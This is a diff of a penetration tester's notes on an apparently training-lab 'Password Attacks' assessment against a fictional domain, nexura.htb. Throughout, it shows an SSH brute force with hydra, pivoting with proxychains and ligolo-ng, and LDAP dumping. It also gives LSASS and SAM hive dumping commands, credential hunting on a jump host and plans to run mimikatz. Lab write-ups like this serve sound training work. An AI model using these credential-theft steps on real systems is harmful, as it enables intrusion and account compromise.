@@ -1,219 +1,197 @@
 # Password Attacks — Skills Assessment
 
-> **Target:** 10.129.234.116 | **OS:** Windows | **Difficulty:** Medium
-> ⚠️ IP changes on restart — confirm current IP before starting.
-> **Updated:** 2026-04-18 11:03 UTC+8
+> **Target:** 10.129.234.116 (DMZ01) → 172.16.119.0/24 (Internal)  
+> **Domain:** nexura.htb  
+> **Status:** RDP session active on JUMP01 — credential hunting in progress  
+> **Updated:** 2026-04-19 14:50 UTC+8
 
 ---
 
-## Assessment Checklist
+## Executive Summary
 
-- [x] Foothold (initial access) — SSH brute force to DMZ01
-- [x] Local enumeration — Linux system, dual NICs, no sudo
-- [x] Credential discovered in bash_history — `hwilliam / dealer-screwed-gym1`
-- [x] Internal network discovered — file01 at 172.16.119.11 (Windows Domain Controller)
-- [x] Pivot to file01 — SSH SOCKS proxy + proxychains nmap scan complete
-- [ ] Access file01 with discovered credentials (WinRM/RDP/SSH)
-- [ ] Domain enumeration (BloodHound, user/groups, attack paths)
-- [ ] Privilege escalation (Kerberoasting, credential hunting)
-- [ ] Flag(s)
+| Phase | Status | Key Finding |
+|-------|--------|-------------|
+| Foothold | ✅ Complete | jbetty / Texas123!@# via SSH brute force |
+| Credential Discovery | ✅ Complete | hwilliam / dealer-screwed-gym1 (bash_history) |
+| Domain Enumeration | ✅ Complete | LDAP dump reveals 3 hosts, Domain Admin: stom |
+| Pivot | ✅ Complete | ligolo-ng tunnel to internal network |
+| Privilege Escalation | 🔄 In Progress | RDP session on JUMP01 — hunting cached credentials |
+| Flags | ⏳ Pending | user.txt, root.txt |
 
 ---
 
-## 1. Recon
+## 1. Foothold — DMZ01
 
-### Target Information
-- **Hostname:** DMZ01
-- **OS:** Linux Ubuntu 5.4.0-216-generic
-- **Architecture:** x86_64
-
-### Network Interfaces
-| Interface | IP Address | Network | Notes |
-|-----------|------------|---------|-------|
-| ens160 | 10.129.234.116/16 | 10.129.0.0/16 | External/VPN facing |
-| ens192 | 172.16.119.13/24 | 172.16.119.0/24 | Internal network |
-| lo | 127.0.0.1 | loopback | |
-
-### Users on System
-- **root** (uid=0) — target for privilege escalation
-- **lab_adm** (uid=1000) — potential lateral movement target
-- **jbetty** (uid=1001) — current user, no sudo rights
-
-### Initial Access — SSH Brute Force
-
-**Victim:** Betty Jayde (Nexura LLC)
-
+### Initial Access
 ```bash
-# Generate usernames from name
 echo "Betty Jayde" | ./username-anarchy -i /dev/stdin > usernames.txt
-
-# Brute force SSH (use single quotes for special chars: !$@#)
 hydra -L usernames.txt -p 'Texas123!@#' ssh://10.129.234.116 -t 4
+# Result: jbetty / Texas123!@#
 ```
 
-**Result:** `jbetty / Texas123!@#`
-
-**Connect:**
-```bash
-ssh jbetty@10.129.234.116
-# Password: Texas123!@#
-```
-
-### Enumeration Summary
-```bash
-id
-# uid=1001(jbetty) gid=1001(jbetty) groups=1001(jbetty)
-
-sudo -l
-# Sorry, user jbetty may not run sudo on DMZ01.
-
-echo $SHELL
-# /bin/bash
-```
-
-**Key Finding:** DMZ01 has dual network interfaces — foothold on 10.129.x.x with access to internal 172.16.119.0/24 network. Pivoting required to reach internal targets.
-
----
-
-## 2. Local Enumeration
-
-### Enumeration Summary
-- **Kernel:** Linux 5.4.0-216-generic (Ubuntu)
-- **SUDO:** No sudo access for jbetty
-- **SUID binaries:** Standard system binaries only (no custom SUID)
-- **Cron jobs:** Standard Ubuntu crons (e2scrub_all, popularity-contest) — not exploitable
-
-### Key Finding: Credential in Bash History
+### Key Finding — Credential in bash_history
 ```bash
 cat /home/jbetty/.bash_history | grep sshpass
 # sshpass -p "dealer-screwed-gym1" ssh hwilliam@file01
 ```
 
-**Discovered Credentials:**
-| Field | Value |
-|-------|-------|
-| Username | `hwilliam` |
-| Password | `dealer-screwed-gym1` |
-| Target Host | `file01` (internal, likely 172.16.119.x) |
+| Credential | Value | Source |
+|------------|-------|--------|
+| Username | `hwilliam` | bash_history |
+| Password | `dealer-screwed-gym1` | bash_history |
 
-### Pivoting Strategy
-DMZ01 has dual NICs with access to internal network `172.16.119.0/24`. The `file01` host is likely in this range.
-
-**Next Steps:**
-1. Scan internal network to locate file01
-2. Use discovered credentials to SSH into file01
-3. Look for privilege escalation or flags on file01
+### Network Position
+| Interface | IP | Network | Purpose |
+|-----------|-----|---------|---------|
+| ens160 | 10.129.234.116 | 10.129.0.0/16 | External/VPN |
+| ens192 | 172.16.119.13 | 172.16.119.0/24 | **Internal pivot** |
 
 ---
 
-## 3. Pivoting to Internal Network
+## 2. Domain Enumeration
 
-### Internal Network Discovery
-**Ping sweep from DMZ01:**
+### LDAP Dump Results
 ```bash
-for i in $(seq 1 254); do ping -c1 -W1 172.16.119.$i & done 2>/dev/null | grep "bytes from"
+proxychains ldapdomaindump -u 'nexura.htb\hwilliam' -p 'dealer-screwed-gym1' 172.16.119.11
 ```
 
-**Results:**
-| Host | IP | TTL | OS |
-|------|-----|-----|-----|
-| DMZ01 (self) | 172.16.119.13 | 64 | Linux |
-| **file01** | **172.16.119.11** | 128 | **Windows** |
+**Domain:** nexura.htb  
+**Domain Controller:** DC01 (172.16.119.11)
 
-TTL 128 indicates Windows operating system.
+### Domain Users
+| User | Name | Groups | Status |
+|------|------|--------|--------|
+| `Administrator` | — | Domain Admins, Enterprise Admins, Schema Admins | Target |
+| `stom` | Tom Sandy | **Domain Admins**, MANAGEMENT | **🎯 Domain Admin** |
+| `hwilliam` | William Hallam | HR | Current access |
+| `bdavid` | David Brittni | IT | — |
 
-### Pivot Setup
-Since DMZ01 has no nmap, we route traffic through it using SSH SOCKS proxy.
+### Domain Computers (DNS Resolved)
+| Host | FQDN | IP | OS | Role |
+|------|------|-----|-----|------|
+| **JUMP01** | JUMP01.nexura.htb | **172.16.119.7** | Windows Server 2019 | **Jump Host** 🎯 |
+| FILE01 | FILE01.nexura.htb | 172.16.119.10 | Windows Server 2019 | File Server |
+| DC01 | DC01.nexura.htb | 172.16.119.11 | Windows Server 2019 | Domain Controller |
 
-**Step 1 — Create SOCKS tunnel (on attack host):**
-```bash
-ssh -D 9050 jbetty@10.129.234.116
-# Password: Texas123!@#
-```
+**Key Discovery:** FILE01 is at **.10**, DC01 at **.11** — separate hosts.
 
-**Step 2 — Configure proxychains (on attack host):**
-```bash
-sudo vim /etc/proxychains.conf
-# Add under [ProxyList]: socks4 127.0.0.1 9050
-```
-
-**Step 3 — Scan internal target:**
-```bash
-sudo proxychains -q nmap -sT -Pn 172.16.119.11 --open
-```
-
-### Internal Network Scan — file01 (172.16.119.11)
-
-**Scan via proxychains:** `sudo proxychains -q nmap -sT -Pn 172.16.119.11 --open`
-
-**Results — 14 open ports:**
-
-| Port | State | Service |
-|------|-------|--------|
-| 53/tcp | open | domain (DNS) |
-| 88/tcp | open | kerberos-sec |
-| 135/tcp | open | msrpc |
-| 139/tcp | open | netbios-ssn |
-| 389/tcp | open | ldap |
-| 445/tcp | open | microsoft-ds (SMB) |
-| 464/tcp | open | kpasswd5 |
-| 593/tcp | open | http-rpc-epmap |
-| 636/tcp | open | ldapssl |
-| 3268/tcp | open | globalcatLDAP |
-| 3269/tcp | open | globalcatLDAPssl |
-| 3389/tcp | open | ms-wbt-server (RDP) |
-| 5985/tcp | open | wsman (WinRM) |
-
-**Assessment:** This is a **Windows Domain Controller**. Multiple authentication methods available — Kerberos, LDAP, SMB, WinRM, RDP. LDAP/Kerberos ports suggest Active Directory.
-
-### Next Steps (Resume Tomorrow)
-1. Connect to file01 via WinRM (port 5985) — preferred for AD enum:
-   ```bash
-   proxychains evil-winrm -i 172.16.119.11 -u hwilliam -p 'dealer-screwed-gym1'
-   ```
-2. Domain enumeration options:
-   - `net user /domain` — list domain users
-   - `net group /domain` — list domain groups
-   - `bloodhound-python` — ingestor for BloodHound analysis
-   - `ldapdomaindump` — LDAP reconnaissance
-3. Privilege escalation vectors:
-   - Kerberoasting (check for SPNs: `setspn -Q */*`)
-   - Stored credentials (`cmdkey /list`, mimikatz)
-   - Service misconfigurations
-4. Flag hunting: Check Desktop, Documents, C:\flags, user profiles
-
-**Session ended:** 2026-04-19 00:15 UTC+8 — Resume tomorrow
-
----
-
-## 4. Post-Exploitation
-
-### Techniques
-
-```bash
-# LSASS dump
-Get-Process lsass
-rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
-
-# SAM/SYSTEM dump
-reg.exe save hklm\sam C:\sam.save
-reg.exe save hklm\system C:\system.save
-reg.exe save hklm\security C:\security.save
-
-# Crack with secretsdump.py
-python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
+### Password Policy
+```ini
+LockoutBadCount = 0    # No account lockout!
+MinimumPasswordLength = 7
+PasswordComplexity = 1
 ```
 
 ---
 
-## 4. Flags
+## 3. Failed Attack Vectors Summary (hwilliam Context)
 
-| Flag | Location | Method |
-|------|----------|--------|
-| user.txt | | |
-| root.txt | | |
+| Attack | Tool/Method | Result | Reason |
+|--------|-------------|--------|--------|
+| WinRM | evil-winrm | ❌ Failed | Authorization error |
+| SMB Write | psexec | ❌ Failed | ADMIN$/C$ not writable |
+| WMI | wmiexec | ❌ Failed | rpc_s_access_denied |
+| RDP (proxychains) | xfreerdp | ❌ Failed | Kerberos realm error |
+| Kerberoasting | GetUserSPNs | ❌ Failed | No user SPNs (only krbtgt) |
+| AS-REP Roasting | GetNPUsers | ❌ Failed | No UF_DONT_REQUIRE_PREAUTH |
+| Password Spray | netexec (3 passwords) | ❌ Failed | No matches |
+| GPP Passwords | SYSVOL enumeration | ❌ Failed | No Preferences folders |
+
+**Position:** hwilliam (HR group) has read-only SMB/LDAP access. Cannot execute code remotely.
+
+---
+
+## 4. Breakthrough — JUMP01 Access
+
+### Discovery
+- **Method:** LDAP domain_computers.json analysis
+- **Host:** JUMP01.nexura.htb (172.16.119.7)
+- **Role:** Jump Host (OU=Jumphosts) — where admins RDP to manage network
+
+### RDP Connection — SUCCESS
+```bash
+xfreerdp /v:172.16.119.7 /u:hwilliam /p:dealer-screwed-gym1 /cert:ignore
+```
+**Status:** ✅ Active RDP session
+
+### Network Topology
+```
+┌─────────────────────────────────────────────────────────────┐
+│                    External (VPN)                            │
+│                      10.129.x.x                              │
+└───────────────────────────┬─────────────────────────────────┘
+                            │
+                    SSH port 22
+                            │
+┌───────────────────────────▼─────────────────────────────────┐
+│                   DMZ01 (Ubuntu)                             │
+│              10.129.234.116 / 172.16.119.13                  │
+│                   jbetty (foothold)                          │
+└───────────────────────────┬─────────────────────────────────┘
+                            │ Internal 172.16.119.0/24
+        ┌───────────────────┼───────────────────┐
+        │                   │                   │
+   RDP 3389             SMB 445             DNS 53
+        │                   │                   │
+┌───────▼──────┐  ┌────────▼────────┐  ┌──────▼──────┐
+│   JUMP01     │  │   FILE01       │  │   DC01      │
+│172.16.119.7  │  │172.16.119.10   │  │172.16.119.11│
+│ Jump Host    │  │ File Server    │  │  Domain     │
+│ 🎯 TARGET    │  │                │  │ Controller  │
+└──────────────┘  └─────────────────┘  └─────────────┘
+```
+
+---
+
+## 5. Current Status — JUMP01 RDP Session
+
+**Host:** JUMP01 (172.16.119.7)  
+**Access:** hwilliam via RDP  
+**Objective:** Find cached credentials for privilege escalation
+
+### Essential Commands to Run on JUMP01
+```powershell
+# Check context
+whoami
+hostname
+
+# Find stored credentials
+cmdkey /list
+
+# Check logged-in users
+quser
+
+# Check for saved RDP sessions
+reg query "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default"
+
+# Look for admin tools running
+Get-Process | Where-Object {$_.ProcessName -match "mstsc|mmc|powershell"}
+
+# Recent files
+Get-ChildItem C:\Users\ -Recurse -Include *.txt,*.xml,*.ps1 -ErrorAction SilentlyContinue | 
+    Sort-Object LastAccessTime -Descending | Select-Object -First 20
+```
+
+### Why JUMP01 is Critical
+- Jump hosts store cached admin credentials
+- Likely has RDP sessions to DC01
+- Credential Manager may contain Domain Admin creds
+
+---
+
+## 6. Next Steps
+
+1. ✅ Check Credential Manager for Domain Admin credentials (`cmdkey /list`)
+2. Look for saved RDP connections to DC01
+3. Run mimikatz if elevated access obtained
+4. Pivot to DC01 with discovered credentials
+5. Capture user.txt and root.txt flags
 
 ---
 
 ## Lessons Learned
 
+- **Jump hosts are gold:** JUMP01 (not in initial ping sweep) revealed via LDAP enumeration
+- **DNS from foothold:** DMZ01 can query DC01 DNS directly — resolved all host IPs
+- **Ligolo-ng > proxychains:** RDP Kerberos issues resolved with TUN interface
+- **ICMP blocked:** Ping sweep misses Windows hosts (firewall), but TCP services work
